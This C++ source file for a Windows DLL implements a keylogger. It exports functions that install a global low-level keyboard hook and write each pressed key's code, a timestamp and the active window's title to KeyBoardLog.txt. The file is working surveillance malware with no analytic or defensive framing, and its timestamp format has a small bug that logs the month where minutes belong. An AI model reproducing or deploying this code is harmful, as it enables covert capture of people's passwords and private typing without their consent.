/// pch.cpp: 与预编译标头对应的源文件
#pragma warning(disable:4996)
#include "pch.h"
#include <stdio.h>
extern "C" {
    __declspec(dllexport) LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
    __declspec(dllexport) BOOL LoadHook();
    __declspec(dllexport) BOOL UnloadHooK();
}
HHOOK g_hHook = NULL;
extern HMODULE g_hModule;
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    FILE* fp = fopen("KeyBoardLog.txt", "a");
    if (nCode == HC_ACTION) {
        char wszTitle[MAX_PATH] = { 0 };
        HWND hWindow = GetForegroundWindow();
        GetWindowTextA(hWindow, wszTitle, MAX_PATH);
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            SYSTEMTIME time;
            GetLocalTime(&time);
            fprintf(fp, "%d %02d-%02d:%02d %s\n", p->vkCode, time.wDay, time.wHour, time.wMonth, wszTitle);
        }
    }
    fclose(fp);
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
BOOL LoadHook() {
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, g_hModule, 0);
    if (g_hHook == NULL) {
        return FALSE;
    }
    return TRUE;
}
BOOL UnloadHooK() {
    if (g_hHook) UnhookWindowsHookEx(g_hHook);
    return TRUE;
}